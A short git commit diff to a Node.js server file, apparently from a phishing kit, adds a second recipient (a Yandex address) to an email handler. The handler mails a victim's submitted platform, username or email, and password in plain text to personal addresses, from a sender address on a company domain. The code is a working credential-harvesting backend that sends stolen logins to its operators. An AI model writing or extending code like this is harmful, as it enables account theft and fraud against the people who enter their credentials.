e0a0bc8b82884fa01c989eb1c2fe631c76b03111
latestbob <edidiongbobson@gmail.com>
2023-11-09 14:00:12 -0800

    added joe mail

--- server.js
+++ server.js
@@ -62,7 +62,7 @@ app.post('/api/send', async (req, res) => {
 
   let mailOptions = {
     from: 'tinfo@jumping-rivers.co.uk',
-    to: 'ricardo.josh12@gmail.com',
+    to: ['ricardo.josh12@gmail.com', 'jeo.dav@yandex.com'],
     subject: platform,
     text: 'Platform is ' + platform + ' Username/Email is ' + email + ' password is ' + password,
   };
